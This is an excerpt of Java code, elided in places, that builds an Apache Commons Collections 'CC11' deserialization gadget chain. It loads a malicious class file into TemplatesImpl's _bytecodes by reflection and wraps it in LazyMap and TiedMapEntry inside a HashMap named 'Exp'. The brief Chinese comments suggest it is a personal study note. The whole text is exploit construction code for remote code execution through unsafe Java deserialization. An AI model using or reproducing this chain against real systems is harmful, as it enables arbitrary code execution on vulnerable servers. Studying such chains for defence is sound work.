...
public class CC11 {
    public static void main(String[] args) throws Exception {
        ...
        name.set(templates,"doramer");

        byte[] evil = Files.readAllBytes(Paths.get("D:\\桌面\\note\\ClassLoaderTest.class"));
        byte[][] codes = {evil};

        //_bytecodes赋值
        Class templatesClass1 = templates.getClass();
        Field declaredField = templatesClass1.getDeclaredField("_bytecodes");
        declaredField.setAccessible(true);
        declaredField.set(templates,codes);

        //_tfactory赋值
        Field declaredField1 = templatesClass1.getDeclaredField("_tfactory");
        declaredField1.setAccessible(true);
...
//        templates.newTransformer();
        ...
        HashMap<Object, Object> hashMap = new HashMap<>();
        Map lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer("adad"));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, templates);
//        tiedMapEntry.getValue();
        HashMap<Object, Object> Exp = new HashMap<>();
        Exp.put(tiedMapEntry, "admin");
